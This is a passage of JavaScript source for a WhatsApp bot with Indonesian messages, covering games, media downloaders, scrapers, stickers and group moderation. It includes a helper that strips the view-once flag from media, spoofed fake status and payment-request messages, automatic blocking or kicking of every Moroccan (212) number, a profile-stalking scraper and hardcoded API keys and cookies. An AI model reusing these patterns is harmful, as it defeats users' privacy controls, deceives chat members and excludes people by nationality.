@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing-masing"
click https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
	    if (!roof.pilih) XeonBotInc.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    if (!roof.pilih2) XeonBotInc.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
	    roof.waktu_milih = setTimeout(() => {
	    if (!roof.pilih && !roof.pilih2) XeonBotInc.sendText(m.chat, `Kedua Pemain Tidak Ingin Bermain,\nSuit Dibatalkan`)
	    else if (!roof.pilih || !roof.pilih2) {
	    win = !roof.pilih ? roof.p2 : roof.p
	    XeonBotInc.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} Tidak Memilih Suit, Game Over!`, m)
	    }
	    delete this.suit[roof.id]
	    return !0
	    }, roof.timeout)
	    }
	    let jwb = m.sender == roof.p
	    let jwb2 = m.sender == roof.p2
	    let g = /Gunting/i
	    let b = /Batu/i
	    let k = /Kertas/i
	    let reg = /^(Gunting|Batu|Kertas)/i
	    if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
	    roof.pilih = reg.exec(m.text.toLowerCase())[0]
	    roof.text = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\n Menunggu lawan untuk memilih` : ''}`)
	    if (!roof.pilih2) XeonBotInc.sendText(roof.p2, '_Lawan telah memilih\kSekarang giliranmu', 0)
	    }
	    if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
	    roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
	    roof.text2 = m.text
	    m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\n Menunggu lawan untuk memilih` : ''}`)
	    if (!roof.pilih) XeonBotInc.sendText(roof.p, '_ Lawan telah memilih\kSekarang giliranmu', 0)
	    }
	    let stage = roof.pilih
	    let stage2 = roof.pilih2
	    if (roof.pilih && roof.pilih2) {
	    clearTimeout(roof.waktu_milih)
	    if (b.test(stage) && g.test(stage2)) win = roof.p
	    else if (b.test(stage) && k.test(stage2)) win = roof.p2
	    else if (g.test(stage) && k.test(stage2)) win = roof.p
	    else if (g.test(stage) && b.test(stage2)) win = roof.p2
	    else if (k.test(stage) && b.test(stage2)) win = roof.p
	    else if (k.test(stage) && g.test(stage2)) win = roof.p2
	    else if (stage == stage2) tie = true
	    XeonBotInc.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERIES' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Win \n` : ` Lost \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Win \n` : ` Lost  \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
	    delete this.suit[roof.id]
	    }
	    } //end
function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  console.log({ms,h,m,s})
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
m.reply(`
You Quit AFK${user.afkReason ? ' After: ' + user.afkReason : ''}
During ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

		// auto set bio
	if (db.settings[botNumber].autobio) {
	    let setting = global.db.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let uptime = await runtime(process.uptime())
		await XeonBotInc.updateProfileStatus(`${XeonBotInc.user.name} | Runtime : ${runtime(uptime)}`)
		setting.status = new Date() * 1
	    }
	}

//autoblock 212
if (global.autoblockmorroco) {
if (m.sender.startsWith('212')) return XeonBotInc.updateBlockStatus(m.sender, 'block')
}

//autokick 212
if (global.autokickmorroco) {
if (m.isGroup && m.sender.startsWith('212')) return XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}


//antispam kick
if (global.antispam) {
if (m.isGroup && m.message && msgFilter.isFiltered(from)) {

console.log(`${global.themeemoji}[SPAM]`, color(moment(m.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))

return await XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}

}

async function sendXeonBotIncMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await XeonBotInc.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}

//group chat msg by xeon
const replygcxeon = (teks) => {
XeonBotInc.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./YaeMedia/theme/cheemspic.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})
}

const reply = (teks) => {
XeonBotInc.sendMessage(from, { text: teks }, { quoted : m })
}

const sendvn = (teks) => {
XeonBotInc.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}




//autoreply
for (let BhosdikaXeon of VoiceNoteXeon) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./YaeMedia/audio/${BhosdikaXeon}.mp3`)
XeonBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of StickerXeon){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./YaeMedia/sticker/${BhosdikaXeon}.webp`)
XeonBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageXeon){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./YaeMedia/image/${BhosdikaXeon}.jpg`)
XeonBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoXeon){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./YaeMedia/video/${BhosdikaXeon}.mp4`)
XeonBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}
XeonBotInc.copyNForward = async (jid, message, forceForward = false, options = {}) => {
let vtype
if (options.readnce) {
message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
vtype = Object.keys(message.message.viewOnceMessage.message)[0]
delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
delete message.message.viewOnceMessage.message[vtype].viewOnce
message.message = {
...message.message.viewOnceMessage.message
}
}
let mtype = Object.keys(message.message)[0]
let content = await generateForwardMessageContent(message, forceForward)
let ctype = Object.keys(content)[0]
let context = {}
if (mtype != "conversation") context = message.message[mtype].contextInfo
content[ctype].contextInfo = {
...context,
...content[ctype].contextInfo
}
const waMessage = await generateWAMessageFromContent(jid, content, options ? {
...content[ctype],
...options,
...(options.contextInfo ? {
contextInfo: {
...content[ctype].contextInfo,
...options.contextInfo
}
} : {})
} : {})
await XeonBotInc.relayMessage(jid, waMessage.message, { messageId:  waMessage.key.id })
return waMessage
}


const lep = {
key: {
fromMe: true, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption":  `${ownername}`, 
"jpegThumbnail": defaultpp
}
}
}

const ftext = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: `${ownernumber}@s.whatsapp.net` } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
jpegThumbnail: defaultpp } } }

const banRep = () => {
XeonBotInc.sendMessage(m.chat, {
text:`Maaf Anda telah diblokir, harap chat @${creator.split("@")[0]} untuk membatalkan pemblokiran`,
mentions: [creator],
},
{
quoted:m
})
}

//Fake
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=916909137213:916909137213\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./YaeMedia/theme/cheemspic.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}

if (isCmd && isBanned) {
return banRep()
}

let list = []
for (let i of owner) {
list.push({
	    	displayName: await XeonBotInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await XeonBotInc.getName(i)}\nFN:${await XeonBotInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}

const repPy = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}

//let xeonrecordin = ['recording','composing']
//let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]

if (!m.key.fromMe && db.settings[botNumber].autoread){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await XeonBotInc.readMessages([readkey]);
}

XeonBotInc.sendPresenceUpdate('available', m.chat)

if (global.autoTyping) {
if (command) {
XeonBotInc.sendPresenceUpdate('composing', from)
}
}
if (global.autoRecord) {
if (command) {
XeonBotInc.sendPresenceUpdate('recording', from)
}
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const downloadMp4 = async (Link) => {
let gHz = require("./scrape/savefrom")
let Lehd = await gHz.savefrom(Link)
let ghd = await reSize(Lehd.thumb, 300, 300)
let ghed = await ytdl.getInfo(Link)
let gdyr = await XeonBotInc.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Channel Name : ${ghed.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
Title : ${Lehd.meta.title}
Duration : ${Lehd.meta.duration}
Desc : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await XeonBotInc.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
m.reply(`${err}`)
}
}


const downloadMp3 = async (Link) => {
let pNx = require("./scrape/savefrom")
let Puxa = await pNx.savefrom(Link)
let MlP = await reSize(Puxa.thumb, 300, 300)
let PlXz = await ytdl.getInfo(Link)
let gedeyeer = await XeonBotInc.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Channel Name : ${PlXz.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
Title : ${Puxa.meta.title}
Duration : ${Puxa.meta.duration}
Desc : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await XeonBotInc.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
fs.unlinkSync(mp3File)
})
} catch (err) {
m.reply(`${err}`)
}
}
//=================================================================
if (m.isGroup && isAutoAiGc) {
  try {
let data = await fetchJson(`https://kiicodeofficial.my.id/api/ai/bard2?query=${args.join(" ")}&apikey=Dzsyacans`);
      if (data.data && data.data.result) {
    const videoCaption = data.data.result
  .replace(/\\n/g, '\n')
  .replace(/\\/g, '')
  .replace(/\n/g, '')
  .replace(/\nn/g, '')
  .replace(/\*/g, '');
    reply(`${videoCaption}`)
}
  } catch (err) {
    // console.log(err);
    replygcxeon("Upss error, silahkan hubungi owner agar di fix");
    // reply(JSON.stringify(err));
  }
}
//=================================================================
async function makeSticker(media,Sticker, StickerTypes){
  const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
let jancok = new Sticker(media, {
pack: global.packname, // The pack name
author: global.author, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom('.webp')
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono.path);
await XeonBotInc.sendMessage(from,{sticker: nah},{quoted: m})
await fs.unlinkSync(stok)
}

async function sendPoll(jid, text, list) {
XeonBotInc.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}

async function rmbg(buffer) {
let form = new FormData
form.append("size", "auto")
form.append("image_file", fs.createReadStream(buffer), "ntah.webp")
let res = await axios({
  url: "https://api.remove.bg/v1.0/removebg",
  method: "POST",
  data: form,
  responseType: "arraybuffer",
  headers: {
    "X-Api-Key": "dNaWDqPDEuzQTHDba6TACk57",
    ...form.getHeaders()
  }
})
return res.data
}

function ttdown(url) {
  return new Promise((resolve, reject) => {
    if (!url) return reject(new Error("url input is required"));
    axios.get("https://developers.tiklydown.me" + "/api/download", { params: { url } }).then(({ data }) => {
			console.log(data);
			resolve(data); // Menyelesaikan janji dengan mengembalikan data
		}).catch((err) => {
			console.log(err);
			reject(err); // Menyelesaikan janji dengan melempar kesalahan
		});
  });
}


async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function quotesanime () {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 184)
        axios.get('https://otakotaku.com/quote/feed/'+page)
        .then(({ data }) => {
            const $ = cheerio.load(data)
            const hasil = []
            $('div.kotodama-list').each(function(l, h) {
hasil.push({
link: $(h).find('a').attr('href'),
gambar: $(h).find('img').attr('data-src'),
karakter: $(h).find('div.char-name').text().trim(),
anime: $(h).find('div.anime-title').text().trim(),
episode: $(h).find('div.meta').text(),
up_at: $(h).find('small.meta').text(),
quotes: $(h).find('div.quote').text().trim()
})
            })
            resolve(hasil)
        }).catch(reject)
    })
}


async function addCountCmdUser(nama, sender, u) {
var posi = null
var pos = null
Object.keys(u).forEach((i) => {
if (u[i].jid === sender) {
posi = i
}
})
if (posi === null) {
u.push({jid: m.sender, db: [{nama: nama, count: 0}]})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
Object.keys(u).forEach((i) => {
if (u[i].jid === m.sender) {
posi = i
}
})
}
if (posi !== null) {
Object.keys(u[posi].db).forEach((i) => {
if (u[posi].db[i].nama === nama) {
pos = i
}
})
if (pos === null) {
u[posi].db.push({nama: nama, count: 1})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
} else {
u[posi].db[pos].count += 1
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
}
}
}


async function addCountCmd(nama, sender, _db) {
addCountCmdUser(nama, m.sender, _cmdUser)
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].nama === nama) {
posi = i
}
})
if (posi === null) {
_db.push({nama: nama, count: 1})
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
} else {
_db[posi].count += 1
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
}
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function hentaivid() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 1153)
        axios.get('https://sfmcompile.club/page/'+page)
        .then((data) => {
            const $ = cheerio.load(data.data)
            const hasil = []
            $('#primary > div > div > ul > li > article').each(function (a, b) {
hasil.push({
title: $(b).find('header > h2').text(),
link: $(b).find('header > h2 > a').attr('href'),
category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
type: $(b).find('source').attr('type') || 'image/jpeg',
video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
video_2: $(b).find('video > a').attr('href') || ''
})
            })
            resolve(hasil)
        })
    })
}	

async function GetBuffer(url) {
	return new Promise(async (resolve, reject) => {
		let buffer;
		await jimp
			.read(url)
			.then((image) => {
				image.getBuffer(image._originalMime, function (err, res) {
					buffer = res;
				});
			})
			.catch(reject);
		if (!Buffer.isBuffer(buffer)) reject(false);
		resolve(buffer);
	});
}
function GetType(Data) {
	return new Promise((resolve, reject) => {
		let Result, Status;
		if (Buffer.isBuffer(Data)) {
			Result = new Buffer.from(Data).toString("base64");
			Status = 0;
		} else {
			Status = 1;
		}
		resolve({
			status: Status,
			result: Result,
		});
	});
}
async function Cartoon(url) {
	return new Promise(async (resolve, reject) => {
		let Data;
		try {
			let buffer = await GetBuffer(url);
			let Base64 = await GetType(buffer);
			await axios
				.request({
					url: "https://access1.imglarger.com/PhoAi/Upload",
					method: "POST",
					headers: {
						connection: "keep-alive",
						accept: "application/json, text/plain, */*",
						"content-type": "application/json",
					},
					data: JSON.stringify({
						type: 11,
						base64Image: Base64.result,
					}),
				})
				.then(async ({ data }) => {
					let code = data.data.code;
					let type = data.data.type;
					while (true) {
						let LopAxios = await axios.request({
							url: "https://access1.imglarger.com/PhoAi/CheckStatus",
							method: "POST",
							headers: {
								connection: "keep-alive",
								accept: "application/json, text/plain, */*",
								"content-type": "application/json",
							},
							data: JSON.stringify({
								code: code,
								isMember: 0,
								type: type,
							}),
						});
						let status = LopAxios.data.data.status;
						if (status == "success") {
							Data = {
								message: "success",
								download: {
									full: LopAxios.data.data.downloadUrls[0],
									head: LopAxios.data.data.downloadUrls[1],
								},
							};
							break;
						} else if (status == "noface") {
							Data = {
								message: "noface",
							};
							break;
						}
					}
				});
		} catch (_error) {
			Data = false;
		} finally {
			if (Data == false) {
				reject(false);
			}
			resolve(Data);
		}
	});
}
function randomId() {
	return Math.floor(100000 + Math.random() * 900000);
}

async function igstalk(Username) {
  return new Promise((resolve, reject) => {
    axios.get('https://dumpor.com/v/'+Username, {
      headers: {
        "cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
      }
    }).then(res => {
      const $ = cheerio.load(res.data)
      const result = {
        profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
        fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
        username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
        post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
        followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
        following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
        bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
      }
      resolve(result)
    })
  })
}

async function replyprem(teks) {
    m.reply(`Fitur ini untuk pengguna premium, hubungi pemilik untuk menjadi pengguna premium`)
}

        // Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
let mediac = await quoted.download()
await XeonBotInc.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return
let mediac = await quoted.download()
await XeonBotInc.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
//=========================================\\
// Auto download tiktok
const { savefrom } = require('@bochilteam/scraper');
  if (budy.startsWith('https://vt.tiktok.com/') || budy.startsWith('https://www.tiktok.com/') || budy.startsWith('https://vm.tiktok.com/')) {
      let data = await fetchJson(`https://skizo.tech/api/tiktok?url=${budy}&apikey=dzsyabotz`);
  if (data && data.data.play) {
    const videoUrl = data.data.play;
    const authorNickname = data.data.author ? data.data.author.nickname : "Author None";
    const videoTitle = data.data ? data.data.title : "Judul Video Tidak Tersedia";
    const videoDuration = data.data ? data.data.duration : "Durasi Video Tidak Tersedia";
    const videoCaption = `*Author* : ${authorNickname}\n*judul* : ${videoTitle}\n*Durasi* : ${videoDuration}` || "videonya kak";
    XeonBotInc.sendMessage(m.chat, { caption: videoCaption, video: { url: videoUrl } }, { quoted: m });
    }
  }
//=========================================\\
//Auto Download Video Instagram
if(budy.startsWith("https://www.instagram.com/")) {
let data = await fetchJson(`https://api.lolhuman.xyz/api/instagram?apikey=Akiraa&url=${budy}`);
    const videoUrl = data.result[0];
    const videoCaption = "Video Instagram Nya";
    XeonBotInc.sendMessage(m.chat, { caption: 'ini dia video Instagram nya', video: { url: videoUrl } }, { quoted: m });
}
//=========================================\\
//Auto Download Video Facebook
if(budy.includes('https://www.facebook.com/')){
let data = await fetchJson(`https://api.lolhuman.xyz/api/facebook?apikey=Akiraa&url=${budy}`);
  if (data && data.result) {
    const videoUrl = data.result[0];
    const videoCaption = data.caption || "Video Facebook";
    XeonBotInc.sendMessage(m.chat, { caption: videoCaption, video: { url: videoUrl } }, { quoted: m });
  } else {
    replygcxeon('Video Facebook tidak ditemukan atau terjadi kesalahan.');
  }
}
//=========================================\\
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
XeonBotInc.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
XeonBotInc.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
}
}
//=========================================\\
// Anti Link
        if (Antilinkgc) {
        if (budy.match(`chat.whatsapp.com`)) {
        if (!isBotAdmins) return XeonStickBotAdmin()
        let gclink = (`https://chat.whatsapp.com/`+await XeonBotInc.groupInviteCode(m.chat))
        let isLinkThisGc = new RegExp(gclink, 'i')
        let isgclink = isLinkThisGc.test(m.text)
        if (isgclink) return XeonBotInc.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n Anda tidak akan di kick oleh bot karena yang Anda kirim adalah tautan ke grup ini`})
        if (isAdmins) return XeonBotInc.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n Admin mengirimkan link, admin mah bebas memposting link apapun`})
        if (XeonTheCreator) return XeonBotInc.sendMessage(m.chat, {text: `\`\`\`「 Group Link Detected 」\`\`\`\n\n owner telah mengirim tautan, owner bebas memposting tautan apa pun`})
        kice = m.sender
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			XeonBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
			XeonBotInc.sendMessage(from, {text:`\`\`\`「 Group Link Detected 」\`\`\`\n\n@${kice.split("@")[0]} Telah di kick karena mengirimkan tautan grup di grup ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
            }            
        }

 // Antiwame by xeon
  if (antiWame)
  if (budy.includes(`Wa.me`)) {
if (!isBotAdmins) return
bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (XeonTheCreator) return m.reply(bvl)
kice = m.sender
        await XeonBotInc.sendMessage(m.chat,
			    {
			        delete: {
